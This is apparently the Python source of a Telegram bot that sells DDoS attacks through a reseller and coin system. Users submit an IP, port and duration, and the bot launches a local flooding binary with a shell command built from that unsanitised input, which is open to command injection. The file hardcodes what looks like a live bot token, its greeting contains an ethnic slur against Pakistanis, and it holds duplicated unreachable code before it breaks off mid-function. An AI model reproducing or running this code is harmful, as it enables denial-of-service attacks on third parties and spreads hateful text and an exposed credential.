import os
import time
import logging
import asyncio
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7698308538:AAEBNII5Ugj8pyWBTvfoKeobMYfNeG1sXGY'  # Replace with your bot token
OWNER_USERNAME = "AashuZodYt"  # Replace with your Telegram username (without @)
DEFAULT_GROUP_ID = -1002556989384  # Default group ID
max_duration = 240  # Default max attack duration

# Group Management
allowed_groups = {DEFAULT_GROUP_ID}  # Stores allowed group IDs

# Reseller System
resellers = set()  # Stores reseller user IDs
reseller_balances = {}  # Stores reseller balances (user_id: balance)

# Global Cooldown
global_cooldown = 0  # Global cooldown in seconds
last_attack_time = 0  # Timestamp of the last attack

# Track running attacks
running_attacks = {}

# Feedback System
feedback_waiting = {}  # Stores users waiting to give feedback
users_pending_feedback = set()  # Stores users who need to give feedback before next attack
MAX_CONCURRENT_ATTACKS_PER_USER = 1  # Maximum attacks a user can run simultaneously

# Custom Keyboard for All Users in Group Chat
group_user_keyboard = [
    ['💠𝐒𝐭𝐚𝐫𝐭💠', '🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯'],
    ['📋𝐑𝐮𝐥𝐞𝐬📋', '🔍𝐒𝐭𝐚𝐭𝐮𝐬🔍', '💌𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤💌']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

# Custom Keyboard for Resellers in Private Chat
reseller_keyboard = [
    ['💠𝐒𝐭𝐚𝐫𝐭💠', '🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯'],
    ['📋𝐑𝐮𝐥𝐞𝐬📋', '💸𝐁𝐚𝐥𝐚𝐧𝐜𝐞💸']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Custom Keyboard for Owner in Private Chat
owner_keyboard = [
    ['💠𝐒𝐭𝐚𝐫𝐭💠', '🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯'],
    ['📋𝐑𝐮𝐥𝐞𝐬📋', '⏰𝐒𝐞𝐭 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧⏰', '📶𝐒𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝𝐬📶'],
    ['➕𝐀𝐝𝐝 𝐆𝐫𝐨𝐮𝐩➕', '➖𝐑𝐞𝐦𝐨𝐯𝐞 𝐆𝐫𝐨𝐮𝐩➖', '📜𝐋𝐢𝐬𝐭 𝐆𝐫𝐨𝐮𝐩𝐬📜'],
    ['🧮𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫🧮', '✂️𝐑𝐞𝐦𝐨𝐯𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫✂️', '📥𝐀𝐝𝐝 𝐂𝐨𝐢𝐧📥'],
    ['⏳𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧⏳']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

# Conversation States
GET_ATTACK_ARGS = 1
GET_SET_DURATION = 2
GET_SET_THREADS = 3
GET_RESELLER_ID = 4
GET_REMOVE_RESELLER_ID = 5
GET_ADD_COIN_USER_ID = 6
GET_ADD_COIN_AMOUNT = 7
GET_SET_COOLDOWN = 8
GET_ADD_GROUP_ID = 9
GET_REMOVE_GROUP_ID = 10

# Check if bot is used in an allowed group
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in allowed_groups

# Check if the user is the owner
def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

# Check if the user is a reseller
def is_reseller(update: Update):
    return update.effective_user.id in resellers


REQUIRED_CHANNELS = ["@AashuZod", "@AASHUFEEDBACK"]

async def is_user_in_required_channels(bot, user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
            print(f"Checked {channel} for user {user_id} → status: {member.status}")
            if member.status in ["left", "kicked"]:
                return False
        except Exception as e:
            return False
    return True

# Check if the user is authorized to use the bot in private chat
def is_authorized_user(update: Update):
    return is_owner(update) or is_reseller(update)

# Check how many attacks a user has running
def check_user_attacks(user_id):
    count = 0
    for attack in running_attacks.values():
        if attack['user_id'] == user_id:
            count += 1
    return count

# Start Command
async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        user_id = update.effective_user.id
        if not await is_user_in_required_channels(context.bot, user_id):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
            ])
            await update.message.reply_text(
                "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
                reply_markup=keyboard
            )
            return

    if not await is_user_in_required_channels(context.bot, user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
            [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
        ])
        await update.message.reply_text(
            "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
            "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
            "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
            reply_markup=keyboard
        )
        return ConversationHandler.END

        user_id = update.effective_user.id
        if not await is_user_in_required_channels(context.bot, user_id):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
            ])
            await update.message.reply_text(
                "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
                reply_markup=keyboard
            )
            return

        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return

        message = (
            "*🇮🇳 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐘𝐨𝐮𝐫 𝘽𝙖𝙩𝙩𝙡𝙚𝙜𝙧𝙤𝙪𝙣𝙙 🇮🇳*\n\n"
            "*🔰𝐔𝐬𝐞 𝐀𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤🔰*\n\n"
            "*🇵🇰 𝙇𝙀𝙏'𝙎 𝙁𝙐𝘾𝙆 𝙋𝘼𝙆𝙄𝙎𝙏𝘼𝙉𝙄𝙎 🇵🇰 *"
            "* 𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐌𝐀𝐃𝐄 𝐁𝐘 @AashuZodYt *"
        )

        if is_owner(update):
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
        else:
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reseller_markup)
        return

    if not is_allowed_group(update):
        return

    message = (
       "*🇮🇳 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐘𝐨𝐮𝐫 𝘽𝙖𝙩𝙩𝙡𝐞𝐠𝐫𝐨𝐮𝐧𝐝 🇮🇳*\n\n"
        "*🔰𝐔𝐬𝐞 𝐀𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤🔰*\n\n"
       "*🇵🇰 𝙇𝙀𝙏'𝙎 𝙁𝙐𝘾𝙆 𝙋𝘼𝙆𝙄𝙎𝙏𝘼𝙉𝙄𝙎 🇵🇰 *"
       "* 𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐌𝐀𝐃𝐄 𝐁𝐘 @AashuZodYt *"
    )

    await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=group_user_markup)

# Attack Command - Start Conversation
async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        user_id = update.effective_user.id
        if not await is_user_in_required_channels(context.bot, user_id):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
            ])
            await update.message.reply_text(
                "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
                reply_markup=keyboard
            )
            return

    if not await is_user_in_required_channels(context.bot, user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
            [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
        ])
        await update.message.reply_text(
            "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
            "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
            "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
            reply_markup=keyboard
        )
        return ConversationHandler.END

        user_id = update.effective_user.id
        if not await is_user_in_required_channels(context.bot, user_id):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡", url="https://t.me/AashuZod")],
                [InlineKeyboardButton("➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡", url="https://t.me/AASHUFEEDBACK")]
            ])
            await update.message.reply_text(
                "❌ 𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 1 ⚡\n"
                "➡️ 𝑱𝒐𝒊𝒏 𝑪𝒉𝒂𝒏𝒏𝒆𝒍 2 ⚡",
                reply_markup=keyboard
            )
            return

        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return ConversationHandler.END

    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Global check: agar koi bhi attack chal raha hai to naye attack ko allow mat karo
    if running_attacks:
        await update.message.reply_text(
            "⚠️ *𝐀𝐧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 🏃💨. 𝐰𝐚𝐢𝐭 𝐭𝐢𝐥𝐥 𝐢𝐭 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐬 🏁*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    global last_attack_time, global_cooldown
    user_id = update.effective_user.id

    if user_id in users_pending_feedback:
        await update.message.reply_text(
            "⚠️ *𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐛𝐞𝐟𝐨𝐫𝐞 𝐥𝐚𝐮𝐧𝐜𝐡𝐢𝐧𝐠 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤!*\n"
            "📢 Please use the Feedback button to share your experience.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        await update.message.reply_text(f"⚠️ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*", parse_mode='Markdown')
        return ConversationHandler.END

    if check_user_attacks(user_id) >= MAX_CONCURRENT_ATTACKS_PER_USER:
        await update.message.reply_text("🤨 *𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐬𝐭𝐢𝐥𝐥 𝐫𝐮𝐧𝐧𝐢𝐧𝐠!🏃💨 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐟 𝐀𝐧𝐨𝐭𝐡𝐞𝐫.*", parse_mode='Markdown')
        return ConversationHandler.END

    # New check for ongoing attack by this user (may be redundant)
    if user_id in running_attacks:
        await update.message.reply_text("❌ *One attack in progress, wait till it finishes 🏁*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("🇮🇳 *𝐒𝐄𝐍𝐃:- <ɪᴘ> <ᴘᴏʀᴛ> <ᴅᴜʀᴀᴛɪᴏɴ>*", parse_mode='Markdown')
    return GET_ATTACK_ARGS

# Attack Command - Handle Attack Input
async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 3:
        await update.message.reply_text("🚫 *Invalid input! Please enter <ip> <port> <duration>.*", parse_mode='Markdown')
        return ConversationHandler.END

    ip, port, duration = args
    try:
        duration = int(duration)
    except ValueError:
        await update.message.reply_text("❌ *Duration must be a valid number.*", parse_mode='Markdown')
        return ConversationHandler.END

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return ConversationHandler.END

    last_attack_time = time.time()
    
    attack_id = f"{ip}:{port}-{time.time()}"
    user_id = update.effective_user.id
    running_attacks[attack_id] = {
        'user_id': user_id,
        'start_time': time.time(),
        'duration': duration
    }

    await update.message.reply_text(
        f"🚀 *𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭𝐞𝐝!*🚀\n"
        f"🎯 *𝐓𝐚𝐫𝐠𝐞𝐭*: {ip}:{port}\n"
        f"🕒 *𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧*: {duration} sec\n"
        f"📢 *Please provide feedback for another attack!*",
        parse_mode='Markdown'
    )

    async def run_attack():
        try:
            process = await asyncio.create_subprocess_shell(
                f"./ROYAL {ip} {port} {duration}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if attack_id in running_attacks:
                del running_attacks[attack_id]

            if process.returncode == 0:
                users_pending_feedback.add(user_id)
                
                await update.message.reply_text(
                    f"✅ *𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝!*✅\n"
                    f"🎯 *𝐓𝐚𝐫𝐠𝐞𝐭*: {ip}:{port}\n"
                    f"🕒 *𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧*: {duration} sec\n"
                    f"🔥 *The 🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯 command is ready to use*",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    f"❌ *Attack Failed!*\n"
                    f"🎯 *Target*: {ip}:{port}\n"
                    f"🕒 *Duration*: {duration} sec\n"
                    f"💥 *Error*: {stderr.decode().strip()}",
                    parse_mode='Markdown'
                )
        except Exception as e:
            logging.error(f"Error in attack execution: {str(e)}")
            if attack_id in running_attacks:
                del running_attacks[attack_id]
            await update.message.reply_text(
                f"❌ *Attack Error!*\n"
                f"🎯 *Target*: {ip}:{port}\n"
                f"💥 *Error*: {str(e)}",
                parse_mode='Markdown'
            )
    asyncio.create_task(run_attack())

# Feedback Command
async def feedback(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return
    
    user_id = update.effective_user.id
    feedback_waiting[user_id] = True
    await update.message.reply_text(
        "📢 *𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐚𝐬 𝐚 𝐭𝐞𝐱𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐨𝐫 𝐩𝐡𝐨𝐭𝐨.*\n\n"
        "⚠️ *Note:* Any abusive feedback will result in a ban.",
        parse_mode='Markdown'
    )

# Handle Photo Feedback
async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
    if user_id in users_pending_feedback:
        users_pending_feedback.remove(user_id)
    await update.message.reply_text("✅ *𝐓𝐡𝐚𝐧𝐤𝐬 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤! 𝐧𝐨𝐰 𝐘𝐨𝐮 𝐜𝐚𝐜 𝐥𝐚𝐮𝐧𝐜𝐡 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤.*", parse_mode='Markdown')

# Handle Text Feedback
async def handle_text_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        feedback_text = update.message.text
        del feedback_waiting[user_id]
        if user_id in users_pending_feedback:
            users_pending_feedback.remove(user_id)
        await update.message.reply_text("✅ *𝐓𝐡𝐚𝐧𝐤𝐬 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤! 𝐧𝐨𝐰 𝐘𝐨𝐮 𝐜𝐚𝐜 𝐥𝐚𝐮𝐧𝐜𝐡 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤.*", parse_mode='Markdown')
    else:
        await handle_button_click(update, context)

# Set Cooldown Command - Start Conversation
async def set_cooldown_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

# Set Cooldown Command - Handle Cooldown Input
async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        await update.message.reply_text(f"✅ *Global cooldown set to {global_cooldown} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Set Duration Command - Start Conversation
async def set_duration_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

# Set Duration Command - Handle Duration Input
async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Set Threads Command - Start Conversation
async def set_threads_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

# Set Threads Command - Handle Threads Input
async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Reseller Command - Start Conversation
async def add_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

# Add Reseller Command - Handle User ID Input
async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0
        await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Remove Reseller Command - Start Conversation
async def remove_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

# Remove Reseller Command - Handle User ID Input
async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Coin Command - Start Conversation
async def add_coin_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

# Add Coin Command - Handle User ID Input
async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text("⚠️ *Enter the amount of coins to add.*", parse_mode='Markdown')
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Coin Command - Handle Amount Input
async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            await update.message.reply_text(f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Balance Command
async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    await update.message.reply_text(f"💰 *Your current balance is: {balance} coins*", parse_mode='Markdown')

# Check Status Command
async def check_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name

    feedback_pending = user_id in users_pending_feedback

    status_message = (
        f"🔍 *𝐔𝐬𝐞𝐫  𝐒𝐭𝐚𝐭𝐮𝐬*\n\n"
        f"👤 *𝐔𝐬𝐞𝐫 :* {escape_markdown(user_name, version=2)}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📢 *𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐏𝐞𝐧𝐝𝐢𝐧𝐠:* {'Yes' if feedback_pending else 'No'}\n\n"
        f"⚡ *You have access to use this bot in this group!*"
    )

    await update.message.reply_text(status_message, parse_mode='Markdown')

# Add Group Command - Start Conversation
async def add_group_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to add.*", parse_mode='Markdown')
    return GET_ADD_GROUP_ID

# Add Group Command - Handle Group ID Input
async def add_group_input(update: Update, context: CallbackContext):
    group_id_str = update.message.text

    try:
        group_id = int(group_id_str)
        allowed_groups.add(group_id)
        await update.message.reply_text(f"✅ *Group with ID {group_id} added successfully!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Remove Group Command - Start Conversation
async def remove_group_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to remove.*", parse_mode='Markdown')
    return GET_REMOVE_GROUP_ID

# Remove Group Command - Handle Group ID Input
async def remove_group_input(update: Update, context: CallbackContext):
    group_id_str = update.message.text

    try:
        group_id = int(group_id_str)
        if group_id in allowed_groups:
            allowed_groups.remove(group_id)
            await update.message.reply_text(f"✅ *Group with ID {group_id} removed successfully!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Group not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# List Groups Command
async def list_groups(update: Update, context: CallbackContext):
    if not is_owner(update):
